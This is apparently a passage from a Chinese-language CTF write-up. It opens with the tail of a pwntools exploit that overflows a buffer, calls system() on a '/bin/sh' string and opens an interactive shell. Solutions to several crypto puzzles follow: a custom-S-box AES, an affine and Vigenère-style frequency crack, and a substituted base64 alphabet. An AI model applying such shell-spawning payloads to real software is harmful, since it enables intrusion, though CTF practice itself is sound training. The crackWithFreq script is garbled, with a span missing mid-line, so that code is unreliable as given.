    payload += p32(0x004006C8)
    payload += 'a'*0x1c
    payload += 'a'*4 #s0
    payload += p32(binsh_addr)
    payload += p32(system_addr)
    payload += 'a'*4
    payload += p32(0x004007A4)
    r.send(payload)
    r.interactive()
# Crypto
## funny_php
根据给出的加密函数，写出解密php代码。
flag{easy_encode}
## This_is_not_a_standard_AES256
先nc获取信息
    PS C:\Users\HiragaAya> nc 49.233.64.38 22333
    This is you Sbox(tuple)
    126, 143, 160, 15, 180, 170, 84, 152, 109, 20, 40, 136, 49, 179, 125, 165, 53, 251, 215, 87, 167, 41, 241, 178, 253, 239, 233, 193, 60, 110, 14, 246, 89, 228, 31, 42, 72, 213, 22, 102, 111, 52, 28, 254, 5, 219, 98, 94, 36, 161, 223, 191, 62, 57, 200, 133, 130, 149, 93, 248, 3, 13, 164, 76, 17, 101, 236, 51, 182, 81, 127, 185, 197, 100, 166, 183, 10, 18, 243, 196, 201, 119, 85, 131, 80, 46, 7, 224, 32, 158, 146, 71, 19, 25, 112, 249, 138, 139, 55, 175, 226, 1, 78, 106, 181, 211, 118, 218, 9, 64, 173, 207, 105, 63, 108, 235, 77, 134, 45, 44, 88, 171, 240, 65, 232, 33, 82, 227, 217, 129, 70, 8, 177, 128, 252, 135, 61, 190, 12, 150, 58, 216, 59, 121, 206, 188, 187, 104, 27, 242, 34, 212, 30, 176, 203, 244, 230, 141, 247, 114, 117, 0, 237, 39, 234, 21, 148, 2, 238, 250, 74, 4, 145, 29, 189, 192, 103, 229, 123, 163, 144, 153, 255, 154, 202, 86, 225, 195, 67, 37, 245, 43, 142, 221, 147, 209, 174, 97, 92, 231, 90, 107, 122, 56, 157, 35, 6, 156, 199, 120, 68, 116, 162, 79, 69, 198, 95, 38, 140, 169, 205, 204, 115, 210, 113, 23, 24, 132, 91, 73, 184, 172, 54, 159, 214, 47, 186, 208, 96, 66, 151, 83, 168, 99, 222, 26, 75, 124, 48, 137, 50, 155, 194, 16, 220, 11
    ----------------    This is you key(str)
    letrvcgspwxjknzfylteavqbimszrwhk
    ----------------    This is you cipher(list)
    93, 78, 25, 81, 18, 232, 250, 12, 94, 128, 81, 128, 88, 156, 180, 110, 151, 87, 197, 247, 8, 228, 51, 71, 102, 38, 146, 218, 40, 70, 6, 16
    ----------------    Enjoy it!
    PS C:\Users\HiragaAya>
然后使用exp.py
    import AES256,sbox
    send = (126, 143, 160, 15, 180, 170, 84, 152, 109, 20, 40, 136, 49, 179, 125, 165, 53, 251, 215, 87, 167, 41, 241, 178, 253, 239, 233, 193, 60, 110, 14, 246, 89, 228, 31, 42, 72, 213, 22, 102, 111, 52, 28, 254, 5, 219, 98, 94, 36, 161, 223, 191, 62, 57, 200, 133, 130, 149, 93, 248, 3, 13, 164, 76, 17, 101, 236, 51, 182, 81, 127, 185, 197, 100, 166, 183, 10, 18, 243, 196, 201, 119, 85, 131, 80, 46, 7, 224, 32, 158, 146, 71, 19, 25, 112, 249, 138, 139, 55, 175, 226, 1, 78, 106, 181, 211, 118, 218, 9, 64, 173, 207, 105, 63, 108, 235, 77, 134, 45, 44, 88, 171, 240, 65, 232, 33, 82, 227, 217, 129, 70, 8, 177, 128, 252, 135, 61, 190, 12, 150, 58, 216, 59, 121, 206, 188, 187, 104, 27, 242, 34, 212, 30, 176, 203, 244, 230, 141, 247, 114, 117, 0, 237, 39, 234, 21, 148, 2, 238, 250, 74, 4, 145, 29, 189, 192, 103, 229, 123, 163, 144, 153, 255, 154, 202, 86, 225, 195, 67, 37, 245, 43, 142, 221, 147, 209, 174, 97, 92, 231, 90, 107, 122, 56, 157, 35, 6, 156, 199, 120, 68, 116, 162, 79, 69, 198, 95, 38, 140, 169, 205, 204, 115, 210, 113, 23, 24, 132, 91, 73, 184, 172, 54, 159, 214, 47, 186, 208, 96, 66, 151, 83, 168, 99, 222, 26, 75, 124, 48, 137, 50, 155, 194, 16, 220, 11) 
    invsbox = sbox.InvSbox(send)
    print (invsbox)
    cipher = [93, 78, 25, 81, 18, 232, 250, 12, 94, 128, 81, 128, 88, 156, 180, 110, 151, 87, 197, 247, 8, 228, 51, 71, 102, 38, 146, 218, 40, 70, 6, 16]
    key = "letrvcgspwxjknzfylteavqbimszrwhk"
    plain = AES256.decrypt(cipher,key,"ECB","")
    AES256.plain_to_ascii(plain)
运行得到逆S盒
    161, 101, 167, 60, 171, 44, 206, 86, 131, 108, 76, 255, 138, 61, 30, 3, 253, 64, 77, 92, 9, 165, 38, 225, 226, 93, 245, 148, 42, 173, 152, 34, 88, 125, 150, 205, 48, 189, 217, 163, 10, 21, 35, 191, 119, 118, 85, 235, 248, 12, 250, 67, 41, 16, 232, 98, 203, 53, 140, 142, 28, 136, 52, 113, 109, 123, 239, 188, 210, 214, 130, 91, 36, 229, 170, 246, 63, 116, 102, 213, 84, 69, 126, 241, 6, 82, 185, 19, 120, 32, 200, 228, 198, 58, 47, 216, 238, 197, 46, 
    243, 73, 65, 39, 176, 147, 112, 103, 201, 114, 8, 29, 40, 94, 224, 159, 222, 211, 160, 106, 81, 209, 143, 202, 178, 247, 14, 0, 70, 133, 129, 56, 83, 227, 55, 117, 135, 11, 249, 96, 97, 218, 157, 192, 1, 180, 172, 90, 194, 166, 57, 139, 240, 7, 181, 183, 251, 207, 204, 89, 233, 2, 49, 212, 179, 62, 15, 74, 20, 242, 219, 5, 121, 231, 110, 196, 99, 153, 132, 23, 13, 4, 104, 68, 75, 230, 71, 236, 146, 145, 174, 137, 51, 175, 27, 252, 187, 79, 72, 215, 208, 54, 80, 184, 154, 221, 220, 144, 111, 237, 195, 223, 105, 151, 37, 234, 18, 141, 128, 107, 45, 254, 193, 244, 50, 87, 186, 100, 127, 33, 177, 156, 199, 124, 26, 164, 115, 66, 162, 168, 25, 122, 22, 149, 78, 155, 190, 31, 158, 59, 95, 169, 17, 134, 24, 43, 182
填入AES256.py的前面
    (161, 101, 167, 60, 171, 44, 206, 86, 131, 108, 76, 255, 138, 61, 30, 3, 253, 64, 77, 92, 9, 165, 38, 225, 226, 93, 245, 148, 42, 173, 152, 34, 88, 125, 150, 205, 48, 189, 217, 163, 10, 21, 35, 191, 119, 118, 85, 235, 248, 12, 250, 67, 41, 16, 232, 98, 203, 53, 140, 142, 28, 136, 52, 113, 109, 123, 239, 188, 210, 214, 130, 91, 36, 229, 170, 246, 63, 116, 102, 213, 84, 69, 126, 241, 6, 82, 185, 19, 120, 32, 200, 228, 198, 58, 47, 216, 238, 197, 46, 
    243, 73, 65, 39, 176, 147, 112, 103, 201, 114, 8, 29, 40, 94, 224, 159, 222, 211, 160, 106, 81, 209, 143, 202, 178, 247, 14, 0, 70, 133, 129, 56, 83, 227, 55, 117, 135, 11, 249, 96, 97, 218, 157, 192, 1, 180, 172, 90, 194, 166, 57, 139, 240, 7, 181, 183, 251, 207, 204, 89, 233, 2, 49, 212, 179, 62, 15, 74, 20, 242, 219, 5, 121, 231, 110, 196, 99, 153, 132, 23, 13, 4, 104, 68, 75, 230, 71, 236, 146, 145, 174, 137, 51, 175, 27, 252, 187, 79, 72, 215, 208, 54, 80, 184, 154, 221, 220, 144, 111, 237, 195, 223, 105, 151, 37, 234, 18, 141, 128, 107, 45, 254, 193, 244, 50, 87, 186, 100, 127, 33, 177, 156, 199, 124, 26, 164, 115, 66, 162, 168, 25, 122, 22, 149, 78, 155, 190, 31, 158, 59, 95, 169, 17, 134, 24, 43, 182)
    flag{sbox_to_invsbox}
    PS C:\Users\HiragaAya>
## crackWithFreq
利用字母频率破解密文。
首先使用重合指数法猜接触密钥长度，得到长度为 12。这里解出出来的长度其实是 key1 key2 长度的最小公倍数。然后，将密文中的 每个字母以 12
为间隔分 12 组（假如密文是: ABCDEFGHIJKLMN，以 3 为间隔分一 组，那么 ADGJM 就是一组）。
这样每组既可以看作一个仿射密码的破解，这时密钥空间只有256，可以爆破利用字母频率进行破解。
    # -*- coding: utf-8 -*-    from pycipher import Affine
    import string
    table = string.ascii_lowercase
    englishExpectedFrequencies = {
        'a': 0.08167, 'b': 0.01492, 'c': 0.02782, 'd': 0.04253,
        'e': 0.12702, 'f': 0.02228, 'g': 0.02015, 'h': 0.06094,
        'i': 0.06966, 'j': 0.00153, 'k': 0.00772, 'l': 0.04025,
        'm': 0.02406, 'n': 0.06749, 'o': 0.07507, 'p': 0.01929,
        'q': 0.00095, 'r': 0.05987, 's': 0.06327, 't': 0.09056,
        'u': 0.02758, 'v': 0.00978, 'w': 0.02361, 'x': 0.00150,
        'y': 0.01974, 'z': 0.00074
        }
    dic = {1: 1, 3: 9, 5: 21, 7: 15, 9: 3, 11: 19, 15: 7, 17: 23, 19: 11, 21: 5, 23: 17, 25: 25}
    # 找出假定秘钥长度内的最可能长度
    # 所用的方法：重合指数法
    def decryptFirstStage(toDecrypt):   # 将密文传入。
        min_len = 3
        max_len = 15
        toDecrypt = toDecrypt.lower()   # 将密文转为小写
        best_len = 0
        best_aver = 0
        best_rate = 0.65
        min_rate = 100
        for i in range(0, len(toDecrypt)):  # 每次循环测试一个密钥长度。
            lengthOfKey = i + 1
            averageIC = 0.0             # 重置 averageIC
            sequenceDictionary = {}     # 序列字典或用于统计分组。
            hadZeroError = False  # hadZeroError 或用于预防某种错误的计算。
            # 此循环用于生成分组字典 sequenceDictionary
            for index in range(0, len(toDecrypt)):
                sequenceNumber = index % lengthOfKey    # 密文中的第 index 个字符应该属于那个分组。
                if sequenceNumber in sequenceDictionary:    # 分组若存在，则将 toDecrypt[index] 加入分组字符串，如不存在，则先创建再添加。
                    sequenceDictionary[sequenceNumber] += toDecrypt[index]
                else:
                    sequenceDictionary[sequenceNumber] = toDecrypt[index]
            # 此循环用于生成各个分组的重合指数和 averageIC
            for stringSequence in sequenceDictionary.values():
                try:
                    averageIC += calculateIC(stringSequence)    # 统计各个分组的重合指数，并求和。最后储存在 averageIC 中。引入了自定义函数 calculateIC()
                except ZeroDivisionError:
                    hadZeroError = True
                    break
            if hadZeroError == True:
                averageIC = 0
            else:
                averageIC /= len(sequenceDictionary.keys())     # averageIC 求平均值。
            rate = abs(1 - (averageIC / best_rate))
            # 这个判断用于选出最佳长度
            if (min_len  fitness:
                    key_a = i
                    key_b = j
                    fitness = bestFitness
                    bestResult = result
        return bestResult, key_a, key_b
    en = "ltpflwfkqnyfmbjbchqnadkaykyhgpzaezjfrfkdonetcvcrkaaronhdnvghmyzwshrhefgqjfbrphqmgvglgvlfonzzqngxqfsessrhphupnvlfxsxotmzccnqfvmfdlhujqvezonbhsnsgykffzmbhefxtrrfjqsxywnolschammigsuetynevesboxmolrirbzhnhtynalodsgnyhxahlrifjqyijphgaqrlrclrhpattjcegcviubmztdvysstskrqelgfzjmjqhjmnmqkhcumftngxltgebfossacnvscaosixddmzcuqdyxciqaugqzoatgxnhmvczlrrfezzhlqalpogfejetmqfthtojfxeuxmqmushcbwsqtmdfdovtulzhlqccnobdshiqascgqxuyjwegbqdfrogrrgxhwfqpqqayooeoxanrunprzsigmatptaxjfavmaaqazoirructbmffenahsjxyahuajtomfsfnavgbcvsysxsjqkggjvlfreqoxaqlwflfzmipxyqiqaxfgoskauczogsdbaurejccjfoxgnknehlpnkyyjauowhymqfsceosbrydlkofyesrdzakazkbrzcxyastfsnymcarhjmtvgvbtrueoxmlljvhfljqgcmqtcrzjjscrahdtgfozonxvrigqunlrcrilnngvkfsmzwroxmlljvhfljqgcmhlgczvztenqnmpcvocuafoxmqpkkfclpsgafetgcfoezqoajpveuegywqoajitraltjssjedczjvessyevjmsycykypjijensqocbfftehhgltcqocpjijepscsfogjwhvncnbemzospqolhgedcfzsyijwnaoubzjymfnaynpnqogepzdlvgcooftfwsksytpdymjoxcdnnugwysrvhnhtynalodsgnyhlvsacyspwweuxanvusssseetnyfncvkvetsozqtbetyysixyagcgkoky"
    length = decryptFirstStage(en)
    print "Length is: %d" % length
    gp = getGroups(en, length)
    key1 = ""
    key2 = ""
    for p in gp:
        res, a, b = crack(p)
        key1 += table[a]
        key2 += table[b]
    print key1 + '\n' + key2
## JustBase
主要考察的是 base64 的原理。这道题将 base64 编码表中的 0123456789 替换成了 )!@#$%^&*(
。解题者可以通过打印密文中的出现的字符来发现这个规律。
    key = ")!@#$%^&*("
    tmp = ""
    for c in b:
        if c in '!@#$%^&*()':
            c = key.index(c)
        tmp += str(c)
    print base64.b64decode(tmp)